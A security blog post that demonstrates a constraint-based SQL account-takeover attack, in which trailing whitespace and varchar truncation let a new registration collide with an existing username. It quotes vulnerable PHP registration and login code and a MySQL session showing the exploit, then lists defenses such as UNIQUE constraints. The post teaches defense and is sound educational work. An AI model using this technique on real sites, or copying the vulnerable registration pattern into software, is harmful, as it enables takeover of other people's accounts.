---

layout: post
title: "SQL Attack (Constraint-based)"
author: "Dhaval Kapil"
excerpt: "Demonstrating a constraint-based SQL Attack"
keywords: sql, trailing, space, length, vulnerability, constraint, database, security

---

> ## Introduction

It is good to know that nowadays, developers have started paying attention to security while building websites. Almost everyone is aware of [SQL Injection](https://www.owasp.org/index.php/SQL_Injection). Herein, I would like to discuss another kind of vulnerability related to SQL databases which is as dangerous as SQL Injection, and yet not as common. I shall demonstrate the attack and discuss various defense strategies.

_Disclaimer_: This post is **NOT** about SQL Injection.

> ## Background

Recently, I came across an interesting piece of code. The developer had tried to make every possible attempt to secure access to the database. The following code is run whenever a new user tries to register:

```php
<?php
// Checking whether a user with the same username exists
$username = mysql_real_escape_string($_GET['username']);
$password = mysql_real_escape_string($_GET['password']);
$query = "SELECT * 
          FROM users 
          WHERE username='$username'";

$res = mysql_query($query, $database);
if($res) { 
  if(mysql_num_rows($res) > 0) {
    // User exists, exit gracefully
    .
    .
  }
  else {
    // If not, only then insert a new entry
    $query = "INSERT INTO users(username, password)
              VALUES ('$username','$password')";
    .
    .
  }
}
```

To check login, the following code is used:

```php
<?php
$username = mysql_real_escape_string($_GET['username']);
$password = mysql_real_escape_string($_GET['password']);

$query = "SELECT username FROM users
          WHERE username='$username'
              AND password='$password' ";

$res = mysql_query($query, $database);
if($res) {
  if(mysql_num_rows($res) > 0){
      $row = mysql_fetch_assoc($res);
      return $row['username'];
  }
}
return Null;
```

Security considerations?

- Filter user input parameters? - **CHECK**

- Use single quotes(') for additional security? - **CHECK**

Cool, what could go wrong?

Well, the attacker can log in as **ANY** user!

> ## The Attack

It is crucial to understand a few points before talking about the attack.

1. While performing string handling in SQL, whitespace characters at the end of the string are removed. In other words, `'vampire'` is treated similarly to `'vampire   '`. This is true for most of the cases, such as strings in WHERE clause or in INSERT statements. For eg., the following query shall return results with even username as `'vampire'`.

   ```sql
   SELECT * FROM users WHERE username='vampire     ';
   ```
    
   Exceptions do exist such as the LIKE clause. Note that this trimming of trailing whitespaces is done mostly during 'string comparison'. This is because, [internally](https://support.microsoft.com/en-in/kb/316626), SQL pads one of the strings with whitespaces so that their length matches before comparing them.

2. In any INSERT query, SQL enforces minimum length constraints on `varchar(n)` by just using the first 'n' characters of the string(in case the length of the string is more than 'n' characters). e.g. if a particular column has a length constraint of '5' characters, then inserting 'vampire' will result in the insert of only 'vampi'.

Now, let us setup a testing database to demonstrate the attack.

```sql
vampire@linux:~$ mysql -u root -p

mysql> CREATE DATABASE testing;
Query OK, 1 row affected (0.03 sec)

mysql> USE testing;
Database changed
```

I am going to create a table `users` with two columns, `username` and `password`. Both of these fields will be limited to 25 characters. Next, I will insert a dummy row with 'vampire' as the username and 'my_password' as the password.

```sql
mysql> CREATE TABLE users (
    ->   username varchar(25),
    ->   password varchar(25)
    -> );
Query OK, 0 rows affected (0.09 sec)

mysql> INSERT INTO users
    -> VALUES('vampire', 'my_password');
Query OK, 1 row affected (0.11 sec)

mysql> SELECT * FROM users;
+----------+-------------+
| username | password    |
+----------+-------------+
| vampire  | my_password |
+----------+-------------+
1 row in set (0.00 sec)
```

To demonstrate the trimming of trailing whitespaces, consider the following query:

```sql
mysql> SELECT * FROM users
    -> WHERE username='vampire       ';
+----------+-------------+
| username | password    |
+----------+-------------+
| vampire  | my_password |
+----------+-------------+
1 row in set (0.00 sec)
```

Now, assume that a vulnerable website uses the earlier mentioned PHP code to handle user registration and login. To break into any user's account(in this case 'vampire'), all that is needed to be done is to register with a username 'vampire[Many whitespaces]1' and a random password. The chosen username should be such that the first 25 characters should consist only of 'vampire' and whitespaces. This will help in bypassing the query which checks whether a particular username already exists or not.

```sql
mysql> SELECT * FROM users
    -> WHERE username='vampire                   1';
Empty set (0.00 sec)
```

Note that while running SELECT queries, SQL **_does not_** shorten the string to 25 characters. Hence, the complete string is searched and no result is obtained. Next, when an INSERT query is run, only the first 25 characters are inserted.

```sql
mysql>   INSERT INTO users(username, password)
    -> VALUES ('vampire                   1', 'random_pass');
Query OK, 1 row affected, 1 warning (0.05 sec)

mysql> SELECT * FROM users
    -> WHERE username='vampire';
+---------------------------+-------------+
| username                  | password    |
+---------------------------+-------------+
| vampire                   | my_password |
| vampire                   | random_pass |
+---------------------------+-------------+
2 rows in set (0.00 sec)
```

Great, now there are two users which will be returned when searching for 'vampire'. Note that the second username is actually 'vampire' plus 18 trailing whitespaces. Now, if logged in with 'vampire' and 'random_pass', any SELECT query that searches by the username will return the first and the original entry. This will enable the attacker to log in as the original user.

This attack has been successfully tested on MySQL and SQLite. I believe it works in other cases as well.

> ## Defenses

Clearly, this is a major vulnerability and needs to be taken care of while developing secure software. A few of the defense measures that can be taken are as follows:

1. UNIQUE constraint should be added to columns which are required/expected to be unique. This actually is a very important rule concerning software development. Even if your code tries to maintain integrity, always define your data properly. With a UNIQUE constraint on 'username', inserting another entry will not be possible. Both the strings will be detected equal and the INSERT query will fail.

2. Always prefer using 'id' as the primary key for your database table. Also, data should be tracked by their id within the program.

3. For added security, you can also manually trim input parameters to a particular length(as set in the database).
